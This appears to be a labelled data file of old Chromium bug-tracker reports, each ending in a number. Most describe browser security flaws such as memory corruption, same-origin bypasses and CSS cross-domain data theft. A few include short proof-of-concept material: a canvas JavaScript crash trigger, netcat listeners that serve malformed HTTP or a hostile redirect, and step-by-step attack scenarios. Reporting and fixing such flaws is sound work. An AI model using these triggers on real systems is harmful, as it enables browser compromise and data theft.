chrome buffer overlow vulnerability saveas function svrt bkis have just discovered vulnerability in google chrome 0.2.149.27 and would like to inform you with this here comes the report details type of issue buffer overflow affected software google chrome 0.2.149.27 exploitation environment google chrome language vietnamese on windows xp sp2 impact remote code execution description the vulnerability is caused due to a boundary error when handling the saveas function on saving a malicious page with an overly long title title tag in html the program causes a stack-based overflow and makes it possible for attackers to execute arbitrary code on users systems how an attacker could exploit the issue to exploit the vulnerability a hacker might construct a specially crafted web page which contains malicious code he then tricks users into visiting his website and convinces them to save this page right after that the code would be executed giving him the privilege to make use of the affected system exploitation code proof of concept crash attached to this document researcher anhld svrt member about svrt bkis vietnam is a security research center in vietnam svrt which is short for security vulnerability research team is one of bkis researching groups svrt specializes in the detection alert and announcement of security vulnerabilities in software operating systems network protocols and embedded systems contact detail name security vulnerability research team bach khoa internetwork security center bkis hanoi university of technology vietnam office 5th floor hitech building 1a dai co viet hanoi email svrt bkav.com.vn webblog security.bkis.vn website www.bkav.com.vn	11
chrome crashes on about product version 0.2.149.27 1583 urls if applicable about other browsers tested add ok or fail after other browsers where you have tested this issue safari 3 firefox 3 ie 7 what steps will reproduce the problem 1 type about in the adressbar 2 3 what is the expected result what happens instead please provide any additional information below attach a screenshot if possible	9
chromehtml uri handler vulnerability a vulnerability in the chromehtml uri handler allows an attacker to bypass the same origin policy for any site and also enumerate victims files and directories when loaded in internet explorer a specially crafted html page can launch google chrome with an arbitrary uri without requiring any user interaction a more detailed and technical security advisory explaining the issues is attached	9
chromehtml uri handler vulnerability a vulnerability in the chromehtml uri handler allows an attacker to bypass the same origin policy for any site and also enumerate victims files and directories when loaded in internet explorer a specially crafted html page can launch google chrome with an arbitrary uri without requiring any user interaction a more detailed and technical security advisory explaining the issues is attached	11
chromehtml uri handler vulnerability a vulnerability in the chromehtml uri handler allows an attacker to bypass the same origin policy for any site and also enumerate victims files and directories when loaded in internet explorer a specially crafted html page can launch google chrome with an arbitrary uri without requiring any user interaction a more detailed and technical security advisory explaining the issues is attached	11
buffer overflow in browser process while de-serializing skbitmap heap overwrite the function bool paramtraits skbitmap read const message m void iter skbitmap has a buffer overflow when it calls bmp_data initskbitmapfromdata r variable_data variable_data_size because bmp_data and variable_data need to be consistent with each other but nobody checks that is so in other words we have memcpy bitmap getpixels pixels total_pixels and pixels and total_pixels are attacker controlled	11
skmask computeimagesize integer overflow an integer overflow can be triggered in skia\sgl\skmask.cpp skmask computeimagesize which leads to chrome 2.x not allocating sufficient memory for data this issue can likely be exploited to execute arbitrary code the vulnerable code is size_t skmask computeimagesize const return fbounds.height frowbytes as you can see there is no check if the result of the multiplication can fit in a size_t here s some javascript that can be used to trigger the issue script ocanvas=document.createelement canvas o2dcontext=ocanvas.getcontext 2d o2dcontext.transform 78,76 6,0 10000,9 o2dcontext.translate 55,0 o2dcontext.rotate 1000 o2dcontext.shadowblur=1000 o2dcontext.shadowoffsetx=1 o2dcontext.clearrect 1,5,48 21 script here s more details cdbfatalexceptioninfo writeav arbitrary chrome memset 100 reproducable after 11 attempts reducing attempt to write to arbitrary memory at arbitrary instruction 03b6bf35 8807 mov byte ptr edi al registers eax=000000ff ebx=03419b90 ecx=8b936f2d edx=00000001 esi=05fee548 edi=8b936f2d esp=05fee50c ebp=05fee534 eip=03b6bf35 stack childebp retaddr 05fee50c 03fc9abf chrome_28f0000 memset unsigned char dst memory read error at address unsigned char value unsigned long count 1 05fee534 03fbf403 chrome_28f0000 ska8_blitter blith int x 12523 int y 380692 int width 1 05fee57c 03fbf27a chrome_28f0000 walk_edges struct skedge prevhead skpath filltype filltype kwinding_filltype 0 class skblitter blitter int stop_y 384133 function proc 05fee638 03fc0058 chrome_28f0000 sk_fill_path class skpath path struct skirect cliprect class skblitter blitter int stop_y 384133 int shiftedgesup 0 class skregion cliprgn 05fee6c0 03fd6c4b chrome_28f0000 skscan fillpath class skpath path class skregion clip class skblitter blitter 05feebd0 03fb958a chrome_28f0000 skscan antifillpath class skpath path class skregion clip class skblitter blitter 05feedd4 03f8d912 chrome_28f0000 skdraw drawpath class skpath origsrcpath class skpaint paint class skmatrix prepathmatrix bool pathismutable false 05feedf0 03fbdcfc chrome_28f0000 skdraw drawpath class skpath src class skpaint paint 05feeee0 03fbd9e4 chrome_28f0000 draw_into_mask struct skmask mask class skpath devpath 05feeef0 03fd6f62 chrome_28f0000 skdraw drawtomask class skpath devpath struct skirect clipbounds class skmaskfilter filter class skmatrix filtermatrix struct skmask mask skmask createmode mode kcomputeboundsandrenderimage_createmode 2 05feefc4 03fb94dd chrome_28f0000 skmaskfilter filterpath class skpath devpath class skmatrix matrix class skregion clip class skbounder bounder class skblitter blitter 05fef1d0 03f8d912 chrome_28f0000 skdraw drawpath class skpath origsrcpath class skpaint paint class skmatrix prepathmatrix bool pathismutable false 05fef1ec 03fb8d90 chrome_28f0000 skdraw drawpath class skpath src class skpaint paint 05fef3a0 03f8d8ae chrome_28f0000 skdraw drawrect struct skrect rect class skpaint paint 05fef3b4 03f9066b chrome_28f0000 skdevice drawrect class skdraw draw struct skrect r class skpaint paint 05fef450 03688600 chrome_28f0000 skcanvas drawrect struct skrect r class skpaint paint 05fef574 0352909d chrome_28f0000 webcore graphicscontext clearrect class webcore floatrect rect 05fef5a0 02c07654 chrome_28f0000 webcore canvasrenderingcontext2d clearrect float x 71 float y 16 float width 48 float height 21 05fef5f8 03419eb9 chrome_28f0000 webcore canvasrenderingcontext2dinternal clearrectcallback class v8 arguments args 05fef730 064f018b chrome_28f0000 v8 internal builtin_handleapicall int argc 5 class v8 internal object argv warning frame ip not in any known module following frames may be wrong 05fef824 03351891 05fef8b8 03351762 chrome_28f0000 v8 internal invoke bool construct true class v8 internal handle v8 internal jsfunction func class v8 internal handle v8 internal jsfunction class v8 internal handle v8 internal object receiver class v8 internal handle v8 internal object int argc 100595660 class v8 internal object args bool has_pending_exception 05fef8dc 03320bb8 chrome_28f0000 v8 internal execution call class v8 internal handle v8 internal jsfunction func class v8 internal handle v8 internal jsfunction class v8 internal handle v8 internal object receiver class v8 internal handle v8 internal object int argc 0 class v8 internal object args bool pending_exception 05fef96c 02a5e5ef chrome_28f0000 v8 function call class v8 handle v8 object recv class v8 handle v8 object int argc 0 class v8 handle v8 value argv 05fef9a4 02ace0bf chrome_28f0000 webcore v8proxy callfunction class v8 handle v8 function function class v8 handle v8 function class v8 handle v8 object receiver class v8 handle v8 object int argc 0 class v8 handle v8 value args 05fefa20 035cb3da chrome_28f0000 webcore scheduledaction execute class webcore scriptexecutioncontext context 05fefa5c 036920c5 chrome_28f0000 webcore domtimer fired void 05fefa94 036921ea chrome_28f0000 webcore threadtimers firetimers double firetime 1239927738.0545001 class wtf vector webcore timerbase 0 firingtimers 05fefac8 03692136 chrome_28f0000 webcore threadtimers sharedtimerfiredinternal void 05fefad0 02904562 chrome_28f0000 webcore threadtimers sharedtimerfired void 05fefae0 02904fdc chrome_28f0000 webkit_glue webkitclientimpl dotimeout void 05fefaec 02904af4 chrome_28f0000 dispatchtomethod webkit_glue webkitclientimpl void class webkit_glue webkitclientimpl obj function method struct tuple0 arg 05fefb08 03ac4b29 chrome_28f0000 base basetimer webkit_glue webkitclientimpl,0 timertask run void 05fefbbc 03ac4bd5 chrome_28f0000 messageloop runtask class task task 05fefbcc 03ac5246 chrome_28f0000 messageloop deferorrunpendingtask struct messageloop pendingtask pending_task 05fefc10 03b51aa0 chrome_28f0000 messageloop dodelayedwork class base time next_delayed_work_time 05fefcf8 03ac444b chrome_28f0000 base messagepumpdefault run class base messagepump delegate delegate 05fefda8 03ac42b0 chrome_28f0000 messageloop runinternal void 05fefde0 03ac413a chrome_28f0000 messageloop runhandler void 05fefe08 03ae9138 chrome_28f0000 messageloop run void 05feffa4 03ae8271 chrome_28f0000 base thread threadmain void 05feffb4 7c80b713 chrome_28f0000 anonymous namespace threadfunc void closure 05feffec 00000000 kernel32 basethreadstart	11
fix connect requests with user-cancelled auth in backporting issue 7338 to stable wah-teh noticed that we were n't correctly handling the case where the user cancels the 407 proxy auth request	1
30x redirects silently honored in response to connect so i think we meant to block loading http scripts and similar subresources from https pages but we were alerted to at least one corner case if the user has proxy auto-configuration enabled or a forgotten proxy and is on a rogue network that has a malicious proxy doing mitm attacks then if a connect request is sent by chrome to the proxy and a http 30x response is generated the redirect is silently followed and no mixed content checks are carried out to demo 1 set up a fake one-shot proxy on your machine echo e http/1.0 302 redirect\nlocation www lcamtuf/js_downgrade.js\nconnection close\n\n nc l p 1234 use cygwin on windows 2 configure your browser to use localhost:1234 as a proxy for https 3 add internal www and crl serving host to the list of exceptions in proxy config 4 open the following html in the browser over snip script var loaded_ok false settimeout check_result 2000 function check_result if loaded_ok alert https http proxy downgrade worked if no warnings shown else alert https http proxy downgrade did not work script script src script snip an internal test is at www lcamtuf/js_downgrade.html	1
30x redirects silently honored in response to connect so i think we meant to block loading http scripts and similar subresources from https pages but we were alerted to at least one corner case if the user has proxy auto-configuration enabled or a forgotten proxy and is on a rogue network that has a malicious proxy doing mitm attacks then if a connect request is sent by chrome to the proxy and a http 30x response is generated the redirect is silently followed and no mixed content checks are carried out to demo 1 set up a fake one-shot proxy on your machine echo e http/1.0 302 redirect\nlocation www lcamtuf/js_downgrade.js\nconnection close\n\n nc l p 1234 use cygwin on windows 2 configure your browser to use localhost:1234 as a proxy for https 3 add internal www and crl serving host to the list of exceptions in proxy config 4 open the following html in the browser over snip script var loaded_ok false settimeout check_result 2000 function check_result if loaded_ok alert https http proxy downgrade worked if no warnings shown else alert https http proxy downgrade did not work script script src script snip an internal test is at www lcamtuf/js_downgrade.html	1
fix connect requests with user-cancelled auth in backporting issue 7338 to stable wah-teh noticed that we were n't correctly handling the case where the user cancels the 407 proxy auth request	1
security browser crash with memmove memory corruption upon large chunked encoding chunk size to reproduce run this listener of death from a linux command line echo ne http/1.1 200 ok\r\ntransfer-encoding chunked\r\n\r\nffff0000\r\nhello\r\n nc l p 8080 localhost i can likely host this on app engine if required and then point chrome at the browser will go down immediately it s memory errors so this will need to go out as a severity critical security update various crash dumps are triggering this in the wild at a rate of many per day so fixing this is a useful stability boost too most usual symptom is thread 5 crashed exception_access_violation chrome.dll string_piece.cc:54 stringpiece find char unsigned int chrome.dll http_chunked_decoder.cc:96 net httpchunkeddecoder scanforchunkremaining char const int chrome.dll http_chunked_decoder.cc:78 net httpchunkeddecoder filterbuf char int chrome.dll http_network_transaction.cc:851 net httpnetworktransaction doreadbodycomplete int chrome.dll http_network_transaction.cc:467 net httpnetworktransaction doloop int chrome.dll http_network_transaction.cc:376 net httpnetworktransaction oniocomplete int however a less usual symptom illustrates the severity thread 6 crashed exception_access_violation chrome.dll memcpy.asm:188 memmove chrome.dll http_chunked_decoder.cc:84 net httpchunkeddecoder filterbuf char int chrome.dll http_network_transaction.cc:851 net httpnetworktransaction doreadbodycomplete int chrome.dll http_network_transaction.cc:467 net httpnetworktransaction doloop int the root cause is a signedness error note that although the code lineage is from mozilla mozilla is not affected because it uses unsigned types in its version i do n't yet have a chromium.org account due to the severity of the issue i d like help landing the patch i m about to upload	11
security possible memory corruption in v8 regex execution engine this bug actually surfaced as a reliability issue the ui-driven test case is 1 go to laksvij/language/tamil.html 2 click in the type your text here textarea 3 instant tab death we re getting crash reports of this in the wild in my debugger i see this 5 in checkhelper file usr/local/google/cevans/chrome/home/chrome-svn/tarball/chromium/src/v8/src/ia32/regexp-macro-assembler-ia32.cc line=1217 source static_cast size_t old_stack_top stack_pointer size condition=false at usr/local/google/cevans/chrome/home/chrome-svn/tarball/chromium/src/v8/src/checks.h:62 6 in v8 internal regexpmacroassembleria32 growstack stack_pointer 3e stack_top at usr/local/google/cevans/chrome/home/chrome-svn/tarball/chromium/src/v8/src/ia32/regexp-macro-assembler-ia32.cc:1217 type return to continue or q return to quit 7 in 8 in 9 in 10 in 11 in stringshape this str at usr/local/google/cevans/chrome/home/chrome-svn/tarball/chromium/src/v8/src/objects-inl.h:191 12 in v8 internal regexpmacroassembleria32 execute code input start_offset=16 input_start n input_end output at_start=true at usr/local/google/cevans/chrome/home/chrome-svn/tarball/chromium/src/v8/src/ia32/regexp-macro-assembler-ia32.cc:1048 13 in v8 internal regexpmacroassembleria32 match regexp_code location subject location offsets_vector offsets_vector_length=116 previous_index=0 at usr/local/google/cevans/chrome/home/chrome-svn/tarball/chromium/src/v8/src/ia32/regexp-macro-assembler-ia32.cc:1005 14 in v8 internal regexpimpl irregexpexec jsregexp location subject location previous_index=0 last_match_info location at usr/local/google/cevans/chrome/home/chrome-svn/tarball/chromium/src/v8/src/jsregexp.cc:444 looks like some form of stack overflow condition which can be a serious security issue therefore marking as security in addition there are traces in the wild indicating memory corruption in this area random sample thread 1 crashed exception_access_violation ntdll.dll rtlplowfragheapfree ntdll.dll rtlfreeheap kernel32.dll heapfree chrome.dll free.c:109 free chrome.dll regexp-stack.cc:82 v8 internal regexpstack ensurecapacity unsigned int chrome.dll regexp-macro-assembler-ia32.cc:1216 v8 internal regexpmacroassembleria32 growstack unsigned char unsigned char chrome.dll objects.cc:3797 v8 internal string readblockintobuffer v8 internal string v8 internal string readblockbuffer unsigned int unsigned int chrome.dll regexp-macro-assembler-ia32.cc:1047 v8 internal regexpmacroassembleria32 execute v8 internal code v8 internal string int unsigned char const unsigned char const int bool chrome.dll regexp-macro-assembler-ia32.cc:1004 v8 internal regexpmacroassembleria32 match v8 internal handle v8 internal code v8 internal handle v8 internal string int int int chrome.dll jsregexp.cc:441 v8 internal regexpimpl irregexpexec v8 internal handle v8 internal jsregexp v8 internal handle v8 internal string int v8 internal handle v8 internal jsarray chrome.dll jsregexp.cc:197 v8 internal regexpimpl exec v8 internal handle v8 internal jsregexp v8 internal handle v8 internal string int v8 internal handle v8 internal jsarray chrome.dll runtime.cc:1047 v8 internal runtime_regexpexec	11
crash open bang.html in windows xp sp3 google chrome 3.0.195.4 which then crashes see screenshot chromium mac build 3.0.198.0 crashes too on the mac v8 js shell it crashes both opt and debug at wanted to file this in the v8 bug reports but it has no option to file as a security bug so filing here instead just-in-case this is exploitable please attribute and acknowledge discovery of testcase to reporter	11
security treat certificate signatures using weak signature algorithms as invalid before we get the windows update that changes cryptoapi to disallow the use of md2 and md4 in certificate signatures we can add code to treat those certificate signatures as invalid sites with an md2 or md4 signature specifically md2withrsaencryption or md4withrsaencryption in the end-entity certificate or an intermediate ca certificate in the certificate chain will get the invalid certificate ssl interstitial page which has only the back button note the signatures in root ca certificates are irrelevant md2withrsaencryption and md4withrsaencryption are the only md2/md4 signature algorithms listed in cryptoapi s header file wincrypt.h	5
security content-type application/rss+xml being rendered as active content security received the following report that seems to be a duplicate of b/1004726 it was also tested in 4.0.206.1 and 2.x hi google security team version tested google chrome v3.0.195.10 vulnerability google chrome s inbuilt rss/atom reader renders untrusted javascript content in an rss/atom feed exploit scenarios 1 attacker can social engineer a user to visit a rss/atom feed link malicious javascript gets executed in the user s browser it is not expected of feeds to execute untrusted content 2 attacker can upload a rss/.atom/file with rss or atom in name with arbitrary extension on a trusted site the trusted site might allow the upload thinking that it is not one of the executable file formats like html php asp and hence wo n't get rendered in the browser chrome does not execute untrusted file types e.g try clicking on the contrary if a user clicks on this link while being authenticated to this trusted site the malicious javascript does get executed in the context of trusted site and user s credentials can get stolen proof of concept any arbitary file extension suggested fix do n't render any javascript content of an rss feed opera 10 is vulnerable to the same issue microsoft ie7 ie8 firefox 3.5 and safari 4 are not vulnerable to this exploit i am planning to disclose this vulnerability on my blog in another 15 days september 23 and hope you can fix it by then i believe in responsible disclosure and want to protect your users from potentially getting exploited please feel free to contact me if you have any questions thanks and regards inferno security researcher securethoughts.com	9
same origin policy bypass via getsvgdocument method chrome version google chrome 2.0.172.43 official build webkit 530.5 v8 1.1.10.15 user agent mozilla/5.0 windows u windows nt 5.1 en-us applewebkit/530.5 khtml like gecko chrome/2.0.172.43 safari/530.5 urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 4 firefox 3.x ok ie 7 ie 8 what steps will reproduce the problem 1 load an svg image in an object tag from a third party site set data as the uri of the svg file type as image/svg+xml 2 get a reference to the object and call the getsvgdocument method 3 this creates a reference to the objects contentdocument 4 from here it is possible to read/set properties of the contentdocument of the third party including cookies what is the expected result permission should be denied by same origin policy what happens instead ability to read/write cookie data and view other data from a third party sites contentdocument please provide any additional information below attach a screenshot if possible proof of concept please note the victim site peacecorpwiki is not under my control it is only used as a demonstration of the issue isaac	2
security add other common html extensions to the dangerous extensions list we consider some file extensions to be malicious exe bat com etc and prompt when saving them as a workaround against file based sop violations we also added html to this list at some point a security researcher contacted security google.com today rightfully pointing out that this mitigation can be bypassed with other extensions such as mht or mhtml i also suspect that in addition to htm and html the same holds true for hta htt xml and maybe xslt we should add these to the list accordingly since this is an external report and the researcher might still want to follow up publicly it would be good to have this patched in a reasonable timeframe in the long run we really need to lock down file sop for files downloaded with chrome and other browsers too	9
empty body setinterval 0 causes 100 cpu use the follow test page script setinterval function 0 script will cause cpu use to sit at 100 sometimes if i leave it alone on the latest dev channel release on my very fast windows 7 box i ve verified that the clamping to 4ms is working correct and that it s not v8 s garbage collector going crazy looks like something else is horribly wrong i have n't been able to repro on os x but given how unreliably this happens with the simple test page i do n't want to say anything definitive about that just yet i think the root cause of this is also behind lots of the various 100 cpu reports seen on various sites gmail nytimes etc since it s very easy to leak a setinterval	7
chrome crash report stack signature webkit weburl weburl webkit weburl const 3db0fd summary data report link mini dump link reportid=d69a5143d749c8df name=upload_file_minidump uptime 231 sec user comments null os unknown xp variant service pack 2 cpu architecture x86 cpu info authenticamd family 15 model 35 stepping 2 rept null ptype null plat null crash type exception_access_violation crash trace weburl.h:66 webkit weburl weburl webkit weburl const webframeloaderclient_impl.cc:533 webframeloaderclient dispatchdidchangelocationwithinpage frameloader.cpp:3870 webcore frameloader continuefragmentscrollafternavigationpolicy webcore resourcerequest const bool frameloader.cpp:3833 webcore frameloader callcontinuefragmentscrollafternavigationpolicy void webcore resourcerequest const wtf passrefptr webcore formstate bool frameloader.cpp:5037 webcore policycheck call bool frameloader.cpp:3986 webcore frameloader continueafternavigationpolicy webcore policyaction webframeloaderclient_impl.cc:880 webframeloaderclient dispatchdecidepolicyfornavigationaction void webcore frameloader webcore policyaction webcore navigationaction const webcore resourcerequest const wtf passrefptr webcore formstate frameloader.cpp:3955 webcore frameloader checknavigationpolicy webcore resourcerequest const webcore documentloader wtf passrefptr webcore formstate void void webcore resourcerequest const wtf passrefptr webcore formstate bool void frameloader.cpp:2295 webcore frameloader loadurl webcore kurl const webcore string const webcore string const bool webcore frameloadtype wtf passrefptr webcore event wtf passrefp tr webcore formstate frameloader.cpp:2240 webcore frameloader loadframerequest webcore frameloadrequest const bool bool wtf passrefptr webcore event wtf passrefptr webcore formst ate frameloader.cpp:412 webcore frameloader urlselected webcore resourcerequest const webcore string const wtf passrefptr webcore event bool bool bool htmlanchorelement.cpp:210 webcore htmlanchorelement defaulteventhandler webcore event node.cpp:2623 webcore node dispatchgenericevent wtf passrefptr webcore event node.cpp:2520 webcore node dispatchevent wtf passrefptr webcore event int node.cpp:2800 webcore node dispatchmouseevent webcore atomicstring const int int int int int int bool bool bool bool bool webcore node wtf passrefptr webcore event node.cpp:2707 webcore node dispatchmouseevent webcore platformmouseevent const webcore atomicstring const int webcore node eventhandler.cpp:1679 webcore eventhandler dispatchmouseevent webcore atomicstring const webcore node bool int webcore platformmouseevent const bool eventhandler.cpp:1438 webcore eventhandler handlemousereleaseevent webcore platformmouseevent const webview_impl.cc:566 webviewimpl mouseup webkit webmouseevent const webview_impl.cc:1049 webviewimpl handleinputevent webkit webinputevent const render_widget.cc:318 renderwidget onhandleinputevent ipc message const render_widget.cc:144 renderwidget onmessagereceived ipc message const render_view.cc:446 renderview onmessagereceived ipc message const message_router.cc:41 messagerouter routemessage ipc message const message_router.cc:32 messagerouter onmessagereceived ipc message const child_thread.cc:114 childthread onmessagereceived ipc message const ipc_channel_proxy.cc:184 ipc channelproxy context onremovefilter ipc channelproxy messagefilter message_pump_default.cc:50 base messagepumpdefault run base messagepump delegate message_loop.cc:199 messageloop runinternal message_loop.cc:181 messageloop runhandler message_loop.cc:155 messageloop run renderer_main.cc:162 renderermain mainfunctionparams const chrome_dll_main.cc:561 chromemain google_update_client.cc:96 google_update googleupdateclient launch hinstance sandbox sandboxinterfaceinfo wchar_t char const int kernel32.dll loaded modules en-us.dll avcodec-52.dll avformat-52.dll avutil-50.dll chrome.dll icudt38.dll chrome.exe advapi32.dll gdi32.dll kernel32.dll lz32.dll msvcrt.dll normaliz.dll ole32.dll oleaut32.dll rpcrt4.dll secur32.dll shell32.dll shlwapi.dll user32.dll version.dll comctl32.dll imm32.dll lpk.dll msvcp60.dll netapi32.dll ntdll.dll oleacc.dll t2embed.dll userenv.dll usp10.dll uxtheme.dll winmm.dll ws2_32.dll ws2help.dll	11
stylesheet url property leaks redirection target publicly disclosed safari-and-google-chrome.html upstream bug firefox called this low severity it s better medium because the impact can be unpleasant for some small subset of websites	7
security cross-domain bug in password manager i have not had a lot of time to test various scenarios with this issue if you have trouble reproducing just let me know and i can try to get a more precise test case in messing around with http digest authentication i discovered a behavior where the password manager pre-populates the login form for one domain with the credentials for another domain it does n't submit them automatically but does leave the user one click away from sending credentials to the wrong place here are the steps i followed on chrome 3.0.195.38 under windows 7 release candidate 0 set up an html page with the following contents html body img src body html this page should be hosted at not protected by any auth 1 next set up an http digest protected area under the following url 2 now set up the attacker s server to be digest protected so that the following url should prompt for digest auth 3 log in to a digest-protected area such as save the password in the password manager 4 now access the unauthenticated html page on the victim s server since the embedded image requires authentication you should get a password prompt the vulnerability i encountered is that the password manager actually prepopulates victim.example.org s credentials in this dialog in message board websites or anywhere that an attacker can post links to images on third party sites this could be a serious phishing issue no other browser i tested does this with digest authentication this is n't the end of the world since passwords are n't that easy to get at but i would be surprised if basic authentication prompts do n't have the same behavior i was doing some general security testing on many browsers when i came across this issue i have some additional observations about security weaknesses in this area which affect many browsers that i ll be publishing in a week or so i will drop a link somewhere here when i get it out and i hope some of your devs will have a chance to review it thanks	4
chrome falls back to direct connections once all proxies have failed chrome has an implicit fallback to direct for proxy lists this policy is different from other browsers ie and firefox which give up rather than falling back to direct if it was n't explicit for example given the proxy list proxy proxy:6233 proxy fallbackproxy:6234 if both of those proxy servers are dead then ie/firefox will display an error page whereas chrome will try using a direct connection so in essense chrome behaves as if the list were proxy proxy:6233 proxy fallbackproxy:6234 direct i think it would be best to match this behavior if for nothing else than to be consistent/compatible with other browsers	0
dns queries not forwarded through socks v5 proxies chrome version srware iron 4.0.227.0 developer build 0 webkit 532.3 v8 1.3.16.2 user agent mozilla/5.0 x11 u linux i686 en-us applewebkit/532.3 khtml like gecko iron/4.0.227.0 chrome/4.0.227.0 safari/532.3 other browsers tested add ok or fail after other browsers where you have tested this issue firefox 3.x ok what steps will reproduce the problem 1 ssh d 8008 remote.host 2 iron proxy-server=socks5 127.0.0.1:8008 3 go to any website what is the expected result that the dns queries are forwarded through the socks proxy what happens instead the dns queries are performed from the local network wireshark clearly shows the dns queries happening on the local network before the page is downloaded through the socks proxy this has very odd results with google s pages google.com youtube.com gmail.com in that they do n't work at all while other pages ask.com for example are displayed without issue these additional problems may be unique to my specific setup but the lack of dns forwarding is certainly not	0
md audit v8 integer errors lead to dangerous crashes in memory allocators quoting mark s raw report below my notes definitely secseverity-high if possible we should sneak a fix into v4 i m surprised this triggers on my x86_64 linux build the root cause of the integer overflow needs fixing of course but if e.g size_t 64-bit on x86_64 had been used for the allocation size it s unlikely that evil javascript could cause an integer overflow 1 javascript v8 core memory integer vulnerabilities file v8/src/factory.cc function several problem type memory corruption compromise type remote sandbox process compromise severity high the core memory allocators in the v8 javascript engine suffer from numerous integer overflows and signed-integer related problems the problematic functions are as follows factory newfixedarray factory newfixedarraywithholes factory newstringdictionary factory newnumberdictionary factory newdescriptorarray each of these functions deal with negative size parameters incorrectly at lower layers this will be discussed shortly note that each of these functions has an assert statement ensuring the size parameter is greater than 0 but these are not compiled in to release versions of chrome these functions are basically just wrappers to lower level memory allocation functions mainly heap allocatefixedarray heap allocatefixedarraywithholes hashtable shape key allocate the two allocatefixedarray functions call heap allocaterawfixedarray which contains an integer overflow when multiplying the requested size in the call to fixedarray sizefor it also handles negative integers incorrectly due to how the newspace allocateraw functions work the latter hashtable allocate function has several potential integer overflows contained within it primarily when rounding up the size using the entrytoindex function note that there is also a signed comparison issue in this function for any negative length that is passed to this function it will be rounded up to 4 these vulnerabilities can be exploited remotely in at least one place the runtime_arrayconcat function in v8/src/runtime.cc this function implements the array.concat function available in javascript by concatenating numerous large arrays it is possible to pass any arbitrarily large integer of the attacker s choosing the various allocation functions and thus trigger the vulnerabilities this is subsequently followed by copying data of the attacker s choosing past the end of the allocated buffer potentially resulting in remote excution a poc is attached	11
md audit v8 integer errors lead to dangerous crashes in memory allocators quoting mark s raw report below my notes definitely secseverity-high if possible we should sneak a fix into v4 i m surprised this triggers on my x86_64 linux build the root cause of the integer overflow needs fixing of course but if e.g size_t 64-bit on x86_64 had been used for the allocation size it s unlikely that evil javascript could cause an integer overflow 1 javascript v8 core memory integer vulnerabilities file v8/src/factory.cc function several problem type memory corruption compromise type remote sandbox process compromise severity high the core memory allocators in the v8 javascript engine suffer from numerous integer overflows and signed-integer related problems the problematic functions are as follows factory newfixedarray factory newfixedarraywithholes factory newstringdictionary factory newnumberdictionary factory newdescriptorarray each of these functions deal with negative size parameters incorrectly at lower layers this will be discussed shortly note that each of these functions has an assert statement ensuring the size parameter is greater than 0 but these are not compiled in to release versions of chrome these functions are basically just wrappers to lower level memory allocation functions mainly heap allocatefixedarray heap allocatefixedarraywithholes hashtable shape key allocate the two allocatefixedarray functions call heap allocaterawfixedarray which contains an integer overflow when multiplying the requested size in the call to fixedarray sizefor it also handles negative integers incorrectly due to how the newspace allocateraw functions work the latter hashtable allocate function has several potential integer overflows contained within it primarily when rounding up the size using the entrytoindex function note that there is also a signed comparison issue in this function for any negative length that is passed to this function it will be rounded up to 4 these vulnerabilities can be exploited remotely in at least one place the runtime_arrayconcat function in v8/src/runtime.cc this function implements the array.concat function available in javascript by concatenating numerous large arrays it is possible to pass any arbitrarily large integer of the attacker s choosing the various allocation functions and thus trigger the vulnerabilities this is subsequently followed by copying data of the attacker s choosing past the end of the allocated buffer potentially resulting in remote excution a poc is attached	11
bug 33266 webcore inlineflowbox determinespacingforflowboxes readav null 43c64e8abbda6766e5f5edbd254c2d57 repro ruby table rt	7
md audit window sandbox crosscallparamsex createfrombuffer integer overflow in src\sandbox\src\crosscall_server.cc there is an integer overflow issue with call_params getparamscount if the param_count value in the untrusted buffer is above max_uint 4 or if param_count is 0 the net effect is that we allocate memory from the heap backing_mem new char actual_size in which actual_size is smaller than required by bytes the following placement new allocation new backing_mem crosscallparamsex causes bytes outside the allocated chunk of the heap to be overwritten i does not appear that the values or location are controlled by the attacker in fact they are just zeros form the above ctor unfortunately now the loop that calls address copied_params getrawparameter is now operating in memory that has not been fully initialized this codepath then performs 7 tests on the address value which random memory is unlikely to pass but one can never be sure the severity rating reflects the fact that the bug is in a security sensitive code-path but i is believed that it would be very hard to exploit this bug beyond dos via heap corruption	11
security cross domain thefts via css string property injection this bug is kind of annoying the hope is that something can be done at the browser level we really do n't want to have to make sweeping changes to lots of our applications and generally burden web apps with more web browser issues this affects chrome safari ie opera and ff but let s keep this bug chrome-private whilst we debate what can be done and protect our customers first the attack involves cross-domain css stylesheet loading because the css parser is very lax it will skip over any amount of preceding and following junk in its quest to find a valid selector here is an example of a valid selector body background-image url and here is an example of a valid selector embedded in an xml document this is a paraphrase of a real example low-severity attack photo_comment from evil blah blah:0 body background-image url from trusted url url_with_key_to_hidden_photo some secret comment photo_comment photo_comment from evil photo_comment as you can see if the attacker can inject a couple of strings into a trusted response there is a useful attack here the data is stolen cross domain with e.g window.getcomputedstyle body_element null getpropertyvalue background-image note that the seemingly redundant blah blah:0 selector is to resync the css parser to make sure the evil descriptor parses properly there are a surprising number of places in our products where an attacker can do this it can apply to html xml json xhtml etc the main common construct that prevents exploitation is newlines obviously newlines can not be considered a defense the exploitable places in google include some json and xml data apis that return responses on a single line some of our xhtml html just happens to be emitted this way too regarding json and xml note that it is not currently a security requirement to escape and xml values or json values within double quoted strings nor should we make it a requirement regarding how to fix the browser here are some starting ideas from an ise-team brainstorm 1 when loading cross-domain css engage a stricter parsing mode that stops on first syntactic but not sematic of course errors 2 same as 1 but also only engage when the mime type is not css 3 some variant of 1 or 2 but only engage when x-content-type-options nosniff is seen wo n't help most of the internet 4 when loading cross-domain css do not send cookies probably breaks the internet please feel free to cc additional people who may be able to help but try and keep within google for now	7
chromium should n't allow xhr to local directories not entirely sure this is a bug but is a difference from other browsers and causes a layouttest to fail looking for input so i can resolve the layouttest properly navigating to a file url for a directory like file c foo gives the following results ie opens a native windows file browsing window for that directory ff nicely formatted directory listing page safari page with a you do n't have permission to open this page message chrome nicely formatted directory listing page doing an xhr to the same url xhr.open get foo true from a local file url gives the following results ie throws exception exception access is denied ff throws exception exception access to restricted uri denied safari fires onerror responsetext chrome success with responsetext the same as the lovely page served when accessed directly so i guess i m asking is the chrome behavior by design if so i ll just rebaseline if not i can file more appropriate bug	7
